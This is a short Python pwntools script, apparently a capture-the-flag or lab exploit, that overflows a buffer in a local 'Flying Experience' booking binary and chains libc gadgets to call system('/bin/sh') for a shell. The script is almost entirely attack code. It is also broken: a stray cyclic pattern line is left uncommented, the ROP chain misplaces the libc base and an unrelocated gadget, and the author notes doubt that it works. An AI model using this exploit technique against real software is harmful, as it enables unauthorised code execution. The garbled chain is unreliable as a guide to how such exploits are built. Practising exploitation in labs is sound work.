#!/usr/bin/env python3

from pwn import *

binary = "./bin/ex1"  
elf = ELF(binary)


p = process(binary)

# base address 0x00007ffff7c00000
#bin/sh offset 1bd0d5
#ssytem offset 00048170
#exit offset 0003a460 

aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaai


base = 0x00007ffff7c00000
pop_rdi = 0x000000000002a3e5  # pop rdi; ret from libc  there is rdi adress in gdb (dk if work)
bin_sh_addr = 0x1bd0d5 # Address of "/bin/sh" in libc
system_addr = 0x00048170  # Address of system() in libc
ret_addr = 0x0003a460  # ret gadget to align stack

# Overflow buffer and reach saved return address
payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(base)
payload += p64(bin_sh_addr + base)
payload += p64(system_addr + base)
payload += p64(ret_addr + base)  # Align stack
payload += b'\n'

# Send payload

p.recvuntil("Welcome to the .hidden Flying Experience! Do you want to check your booking?")
p.sendline("0")
p.recvuntil("Please input your name to check your booking:")

p.sendline(payload)

# Interact with the shell
p.interactive()
